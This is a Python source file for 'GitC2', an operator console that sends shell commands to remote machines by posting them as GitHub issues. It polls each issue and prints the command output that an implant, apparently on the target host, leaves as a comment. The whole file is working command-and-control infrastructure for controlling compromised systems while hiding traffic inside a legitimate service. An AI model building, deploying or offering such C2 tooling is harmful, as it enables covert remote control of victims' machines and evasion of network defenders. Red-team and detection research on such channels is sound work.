import os
import json
import time
import requests

CONFIG_FILE = "settings.json"

def print_banner():
    print("""
 ██████╗ ██╗████████╗     ██████╗██████╗ 
██╔════╝ ██║╚══██╔══╝    ██╔════╝╚════██╗
██║  ███╗██║   ██║       ██║      █████╔╝
██║   ██║██║   ██║       ██║     ██╔═══╝ 
╚██████╔╝██║   ██║       ╚██████╗███████╗
 ╚═════╝ ╚═╝   ╚═╝        ╚═════╝╚══════╝
         github.com/N3agu/GitC2
""")

def load_or_create_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    else:
        print("[!] Configuration not found. Setting up GitC2.")
        
        print("\n[i] HOW TO OBTAIN A GITHUB TOKEN:")
        print("    1. Go to github.com -> Settings -> Developer settings -> Personal access tokens -> Tokens (classic)")
        print("    2. Generate a new token (classic)")
        print("    3. Write a note for the token (\"GitC2 Token\") and select the scope \"repo\"")
        print("    4. Click on \"Generate Token\"\n")
        
        token = input("[+] GitHub Token: ")
        owner = input("[+] Repository Owner: ")
        repo = input("[+] Repository Name: ")
        config = {"token": token, "owner": owner, "repo": repo}
        with open(CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=4)
        print("[!] Settings saved to settings.json\n")
        return config

def main():
    print_banner()
    config = load_or_create_config()
    
    headers = {
        "Authorization": f"token {config['token']}",
        "Accept": "application/vnd.github.v3+json"
    }
    base_url = f"https://api.github.com/repos/{config['owner']}/{config['repo']}/issues"

    while True:
        try:
            cmd = input("GitC2> ")
            if cmd.lower() in ['exit', 'quit']:
                break
            if not cmd.strip():
                continue

            payload = {"title": "Task", "body": cmd}
            res = requests.post(base_url, headers=headers, json=payload)
            
            if res.status_code != 201:
                print(f"Failed to dispatch task: {res.text}")
                continue
            
            issue_number = res.json()["number"]
            print(f"[*] Task dispatched to Issue #{issue_number}. Polling for response...")

            while True:
                time.sleep(5)
                check_res = requests.get(f"{base_url}/{issue_number}", headers=headers)
                
                if check_res.status_code == 200:
                    issue_data = check_res.json()
                    if issue_data["state"] == "closed":
                        comments_res = requests.get(f"{base_url}/{issue_number}/comments", headers=headers)
                        if comments_res.status_code == 200:
                            comments = comments_res.json()
                            if comments:
                                print(f"\n[+] Response received:\n{comments[-1]['body']}\n")
                            else:
                                print("\n[-] Task closed, but no output returned.\n")
                        break
        except KeyboardInterrupt:
            print("\nExiting GitC2...")
            break

if __name__ == "__main__":
    main()